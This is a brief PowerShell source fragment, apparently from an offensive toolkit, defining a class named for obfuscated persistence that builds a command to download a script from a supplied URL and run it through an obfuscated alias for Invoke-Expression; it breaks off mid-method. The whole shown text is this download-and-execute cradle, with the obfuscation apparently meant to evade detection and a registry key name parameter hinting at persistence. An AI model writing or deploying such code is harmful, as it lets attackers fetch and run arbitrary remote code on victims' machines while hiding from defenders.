Class ObfPersistenceExecuteScriptWeb9 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent9.ps1
        $DoAll = ".(Item Alias:\I*X)((New-Object Net.WebClient).DownloadString('$url'))"
